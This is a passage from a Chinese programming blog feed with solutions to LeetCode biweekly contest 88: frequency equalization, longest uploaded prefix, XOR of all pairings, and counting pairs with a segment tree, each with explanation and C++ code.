<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (sum &lt; k) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="built_in">queryIndex</span>(col - <span class="number">1</span>, maxRow, <span class="number">0</span>, row - <span class="number">1</span>, <span class="number">1</span>); k &gt; <span class="number">0</span> &amp;&amp; i &lt;= maxRow; i++) &#123;</span><br><span class="line">            <span class="type">int</span> left = <span class="built_in">querySum</span>(i, i, <span class="number">0</span>, row - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> add = <span class="built_in">min</span>(left, k);</span><br><span class="line">            <span class="built_in">update</span>(i, add, <span class="number">0</span>, row - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">            k -= add;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">            tsum[idx] = col;</span><br><span class="line">            tmin[idx] = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">build</span>(l, mid, <span class="built_in">CHL</span>(idx));</span><br><span class="line">            <span class="built_in">build</span>(mid + <span class="number">1</span>, r, <span class="built_in">CHR</span>(idx));</span><br><span class="line">            tsum[idx] = tsum[<span class="built_in">CHL</span>(idx)] + tsum[<span class="built_in">CHR</span>(idx)];</span><br><span class="line">            tmin[idx] = <span class="built_in">min</span>(tmin[<span class="built_in">CHL</span>(idx)], tmin[<span class="built_in">CHR</span>(idx)]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> val, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; x || r &lt; x) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l == x &amp;&amp; r == x) &#123;</span><br><span class="line">            tsum[idx] -= val;</span><br><span class="line">            tmin[idx] += val;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (x &lt;= mid) &#123;</span><br><span class="line">                <span class="built_in">update</span>(x, val, l, mid, <span class="built_in">CHL</span>(idx));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">update</span>(x, val, mid + <span class="number">1</span>, r, <span class="built_in">CHR</span>(idx));</span><br><span class="line">            &#125;</span><br><span class="line">            tsum[idx] = tsum[<span class="built_in">CHL</span>(idx)] + tsum[<span class="built_in">CHR</span>(idx)];</span><br><span class="line">            tmin[idx] = <span class="built_in">min</span>(tmin[<span class="built_in">CHL</span>(idx)], tmin[<span class="built_in">CHR</span>(idx)]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">queryIndex</span><span class="params">(<span class="type">int</span> minIndex, <span class="type">int</span> maxRow, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; maxRow) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tmin[idx] &gt; minIndex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">            <span class="keyword">return</span> l;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (tmin[<span class="built_in">CHL</span>(idx)] &lt;= minIndex) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">queryIndex</span>(minIndex, maxRow, l, mid, <span class="built_in">CHL</span>(idx));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mid &lt; maxRow) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">queryIndex</span>(minIndex, maxRow, mid + <span class="number">1</span>, r, <span class="built_in">CHR</span>(idx));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">querySum</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; end || r &lt; start) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (start &lt;=l  &amp;&amp; r &lt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span> tsum[idx];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (end &lt;= mid) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">querySum</span>(start, end, l, mid, <span class="built_in">CHL</span>(idx));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (start &gt; mid) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">querySum</span>(start, end, mid + <span class="number">1</span>, r, <span class="built_in">CHR</span>(idx));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">querySum</span>(start, mid, l, mid, <span class="built_in">CHL</span>(idx)) + \</span><br><span class="line">                       <span class="built_in">querySum</span>(mid + <span class="number">1</span>, end, mid + <span class="number">1</span>, r, <span class="built_in">CHR</span>(idx));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> row, col;</span><br><span class="line">    vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; tsum;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; tmin;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 88</title>
    <url>/2022/11/02/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/40/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-88"><a href="#leetcode-biweekly-contest-88" class="headerlink" title="leetcode biweekly contest 88"></a>leetcode biweekly contest 88</h2><p>只能说放水太严重的周赛题目了，最后一题就是线段树的模板题目。</p>
<h4 id="6212-删除字符使频率相同"><a href="#6212-删除字符使频率相同" class="headerlink" title="6212. 删除字符使频率相同"></a>6212. 删除字符使频率相同</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的字符串 <code>word</code>，字符串只包含小写英文字母。你需要选择 一个 下标并 删除 下标处的字符，使得 <code>word</code> 中剩余每个字母出现 频率 相同。</p>
<p>如果删除一个字母后，<code>word</code> 中剩余所有字母的出现频率都相同，那么返回 <code>true</code> ，否则返回 <code>false</code> 。</p>
<p>注意：</p>
<ul>
<li>字母 <code>x</code> 的 频率 是这个字母在字符串中出现的次数。<br>你必须恰好删除一个字母，不能一个字母都不删除。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：word = &quot;abcc&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：选择下标 3 并删除该字母，word 变成 &quot;abc&quot; 且每个字母出现频率都为 1 。</span><br></pre></td></tr></table></figure>

<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：word = &quot;aazz&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：我们必须删除一个字母，所以要么 &quot;a&quot; 的频率变为 1 且 &quot;z&quot; 的频率为 2 ，要么两个字母频率反过来。所以不可能让剩余所有字母出现频率相同。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= word.length &lt;= 100</code></li>
<li><code>word</code> 只包含小写英文字母。</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/remove-letter-to-equalize-frequency/">https://leetcode.cn/problems/remove-letter-to-equalize-frequency/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>太容易出错的题目，因为数量较少，不如直接模拟，对所有的字符种类进行统计，依次尝试减少某一个字符后，所有的数据是否可以相等。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n + |\Sigma|)$，其中 $n$ 表示数组的长度，$|\Sigma|$ 表示字符集。</li>
<li>空间复杂度：$O(C)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">equalFrequency</span><span class="params">(string word)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">26</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> c : word) &#123;</span><br><span class="line">            cnt[c - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                cnt[i]--;</span><br><span class="line">                <span class="type">int</span> prev = <span class="number">0</span>;</span><br><span class="line">                <span class="type">bool</span> isEqual = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (cnt[j] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (prev == <span class="number">0</span>) &#123;</span><br><span class="line">                            prev = cnt[j];</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (prev != cnt[j])&#123;</span><br><span class="line">                            isEqual = <span class="literal">false</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                cnt[i]++;</span><br><span class="line">                <span class="keyword">if</span> (isEqual) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6197-最长上传前缀"><a href="#6197-最长上传前缀" class="headerlink" title="6197. 最长上传前缀"></a>6197. 最长上传前缀</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个 <code>n </code>个视频的上传序列，每个视频编号为 <code>1 </code>到 <code>n</code> 之间的 不同 数字，你需要依次将这些视频上传到服务器。请你实现一个数据结构，在上传的过程中计算 最长上传前缀 。</p>
<p>如果 闭区间<code> 1</code> 到 <code>i</code> 之间的视频全部都已经被上传到服务器，那么我们称 <code>i</code> 是上传前缀。最长上传前缀指的是符合定义的 <code>i</code> 中的 最大值 。</p>
<p>请你实现 <code>LUPrefix</code> 类：</p>
<ul>
<li><code>LUPrefix(int n)</code> 初始化一个 <code>n</code> 个视频的流对象。</li>
<li><code>void upload(int video)</code> 上传 <code>video</code> 到服务器。</li>
<li><code>int longest()</code> 返回上述定义的 最长上传前缀 的长度。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[&quot;LUPrefix&quot;, &quot;upload&quot;, &quot;longest&quot;, &quot;upload&quot;, &quot;longest&quot;, &quot;upload&quot;, &quot;longest&quot;]</span><br><span class="line">[[4], [3], [], [1], [], [2], []]</span><br><span class="line">输出：</span><br><span class="line">[null, null, 0, null, 1, null, 3]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">LUPrefix server = new LUPrefix(4);   // 初始化 4个视频的上传流</span><br><span class="line">server.upload(3);                    // 上传视频 3 。</span><br><span class="line">server.longest();                    // 由于视频 1 还没有被上传，最长上传前缀是 0 。</span><br><span class="line">server.upload(1);                    // 上传视频 1 。</span><br><span class="line">server.longest();                    // 前缀 [1] 是最长上传前缀，所以我们返回 1 。</span><br><span class="line">server.upload(2);                    // 上传视频 2 。</span><br><span class="line">server.longest();                    // 前缀 [1,2,3] 是最长上传前缀，所以我们返回 3 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= video &lt;= 105</code></li>
<li><code>video</code> 中所有值 互不相同 。</li>
<li><code>upload</code> 和 <code>longest</code> 总调用 次数至多不超过 <code>2 * 105</code> 次。</li>
<li>至少会调用 <code>longest</code> 一次。</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/cnunionpay2022/problems/6olJmJ/">https://leetcode.cn/contest/cnunionpay2022/problems/6olJmJ/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>模拟
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们用 $curr$ 指向当前已经上传完成的最大索引，并用哈希表记录当前所有已经上传的编号。</li>
</ol>
<ul>
<li>每次再查询时，我们依次往后查询 $curr + 1, curr + 2, \cdots$ 是否连续的编号是否都已经上传即可。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，其中 $n$ 表示已经上传的次数。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，其中 $n$ 表示已经上传的次数。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LUPrefix</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LUPrefix</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        flag = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">        flag[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">upload</span><span class="params">(<span class="type">int</span> video)</span> </span>&#123;</span><br><span class="line">        flag[video] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span>(curr + <span class="number">1</span> &lt; flag.<span class="built_in">size</span>() &amp;&amp; flag[curr + <span class="number">1</span>]) &#123;</span><br><span class="line">            curr++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> curr;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> curr = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; flag;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6213-所有数对的异或和"><a href="#6213-所有数对的异或和" class="headerlink" title="6213. 所有数对的异或和"></a>6213. 所有数对的异或和</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你两个下标从 <code>0</code> 开始的数组 <code>nums1</code> 和 <code>nums2</code> ，两个数组都只包含非负整数。请你求出另外一个数组 <code>nums3</code> ，包含 <code>nums1</code> 和 <code>nums2</code> 中 所有数对 的异或和（<code>nums1</code> 中每个整数都跟 <code>nums2</code> 中每个整数 恰好 匹配一次）。</p>
<p>请你返回 <code>nums3</code> 中所有整数的 异或和 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [2,1,3], nums2 = [10,2,5,0]</span><br><span class="line">输出：13</span><br><span class="line">解释：</span><br><span class="line">一个可能的 nums3 数组是 [8,0,7,2,11,3,4,1,9,1,6,3] 。</span><br><span class="line">所有这些数字的异或和是 13 ，所以我们返回 13 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [1,2], nums2 = [3,4]</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">所有数对异或和的结果分别为 nums1[0] ^ nums2[0] ，nums1[0] ^ nums2[1] ，nums1[1] ^ nums2[0] 和 nums1[1] ^ nums2[1] 。</span><br><span class="line">所以，一个可能的 nums3 数组是 [2,5,1,6] 。</span><br><span class="line">2 ^ 5 ^ 1 ^ 6 = 0 ，所以我们返回 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums1.length, nums2.length &lt;= 105</code></li>
<li><code>0 &lt;= nums1[i], nums2[j] &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/bitwise-xor-of-all-pairings/">https://leetcode.cn/problems/bitwise-xor-of-all-pairings/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单的数学模拟问题，我们设数组 $nums1,nums2$ 的长度分别为 $m,n$，根据题意可以知道最终异或的结果即为 $nums1$ 的每个元素要与 $nums2$ 中的每个元素异或，则可以知道 $nums1$ 中的每个元素在最终异或的等式中出现了 $n$ 次；$nums2$ 的每个元素要与 $nums1$ 中的每个元素异或，$nums2$ 中的每个元素在最终异或的等式中出现了 $m$ 次。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 为数组的长度。</li>
<li>空间复杂度：时间复杂度为 $O(n)$，$n$ 为数组的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">xorAllNums</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = nums1.<span class="built_in">size</span>(), n = nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (n &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums1) &#123;</span><br><span class="line">                tot ^= v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (m &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums2) &#123;</span><br><span class="line">                tot ^= v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6198-满足不等式的数对数目"><a href="#6198-满足不等式的数对数目" class="headerlink" title="6198. 满足不等式的数对数目"></a>6198. 满足不等式的数对数目</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你两个下标从 <code>0</code> 开始的整数数组 <code>nums1</code> 和 <code>nums2</code> ，两个数组的大小都为 <code>n</code> ，同时给你一个整数 <code>diff</code> ，统计满足以下条件的 数对 <code>(i, j)</code> ：</p>
<ul>
<li><code>0 &lt;= i &lt; j &lt;= n - 1</code> 且<br><code>nums1[i] - nums1[j] &lt;= nums2[i] - nums2[j] + diff.</code><br>请你返回满足条件的 数对数目 。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [3,2,5], nums2 = [2,2,1], diff = 1</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">总共有 3 个满足条件的数对：</span><br><span class="line">1. i = 0, j = 1：3 - 2 &lt;= 2 - 2 + 1 。因为 i &lt; j 且 1 &lt;= 1 ，这个数对满足条件。</span><br><span class="line">2. i = 0, j = 2：3 - 5 &lt;= 2 - 1 + 1 。因为 i &lt; j 且 -2 &lt;= 2 ，这个数对满足条件。</span><br><span class="line">3. i = 1, j = 2：2 - 5 &lt;= 2 - 1 + 1 。因为 i &lt; j 且 -3 &lt;= 2 ，这个数对满足条件。</span><br><span class="line">所以，我们返回 3 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [3,-1], nums2 = [-2,2], diff = -1</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">没有满足条件的任何数对，所以我们返回 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == nums1.length == nums2.length</code></li>
<li><code>2 &lt;= n &lt;= 105</code></li>
<li><code>-104 &lt;= nums1[i], nums2[i] &lt;= 104</code></li>
<li><code>-104 &lt;= diff &lt;= 104</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/number-of-pairs-satisfying-inequality/">https://leetcode.cn/problems/number-of-pairs-satisfying-inequality/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p>线段树或者树状数组</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目实在是太模板题目了，不好怎么平均这个题目，知道线段树之类的模板，题目就非常简单。题目给定的不等式装换为 $nums1[i] -  nums2[i] &lt;&#x3D; nums1[j] - nums2[j] + diff$，我们令 $c[i] &#x3D; nums1[i] -  nums2[i]$，也就装换为 $c[i] &lt;&#x3D; c[j] + diff, \quad (i &lt; j)$，非常模板的题目了，我们每次遍历到 $c[j]$ 时，求处在区间 $[-\infty,c[i] - diff]$ 的元素的数目有多少个，由于题目存在负数，我们加上一个常数 $C$ 使得 $c[i] - diff + C \ge 0$，此时即转换为了求 $[0, c[i] - diff + C]$ 可以取 $C &#x3D; 40000$ 即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log \max(nums))$，其中 $n$ 表示数组的元素，$\max(nums)$ 表示给定的数组的最大值。</li>
<li>空间复杂度：$O(C)$，$C$ 表示给定的常数大小。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CHL(x) (x * 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHR(x) (x * 2 + 1)</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">4e5</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SegTreeNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    <span class="type">int</span> sum;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SegTreeNode tree[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushUpTree</span><span class="params">(<span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">    tree[idx].sum = tree[<span class="built_in">CHL</span>(idx)].sum + tree[<span class="built_in">CHR</span>(idx)].sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">buildTree</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt; r) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">        tree[idx].l = tree[idx].r = l;</span><br><span class="line">        tree[idx].sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tree[idx].l = l;</span><br><span class="line">    tree[idx].r = r;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">buildTree</span>(<span class="built_in">CHL</span>(idx), l, mid);</span><br><span class="line">    <span class="built_in">buildTree</span>(<span class="built_in">CHR</span>(idx), mid + <span class="number">1</span>, r);</span><br><span class="line">    <span class="built_in">pushUpTree</span>(idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">updateTree</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> val, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; tree[idx].l || x &gt; tree[idx].r) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x == tree[idx].l &amp;&amp; x == tree[idx].r) &#123;</span><br><span class="line">        tree[idx].sum += val;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> mid = (tree[idx].l + tree[idx].r) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &lt;= mid) &#123;</span><br><span class="line">        <span class="built_in">updateTree</span>(x, val, <span class="built_in">CHL</span>(idx));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">updateTree</span>(x, val, <span class="built_in">CHR</span>(idx));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">pushUpTree</span>(idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">queryTree</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (r &lt; tree[idx].l || l &gt; tree[idx].r) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (l &lt;= tree[idx].l &amp;&amp; r &gt;= tree[idx].r) &#123;</span><br><span class="line">        <span class="keyword">return</span> tree[idx].sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> mid = (tree[idx].l + tree[idx].r) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (r &lt;= mid) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">queryTree</span>(l, r, <span class="built_in">CHL</span>(idx));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (l &gt; mid) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">queryTree</span>(l, r, <span 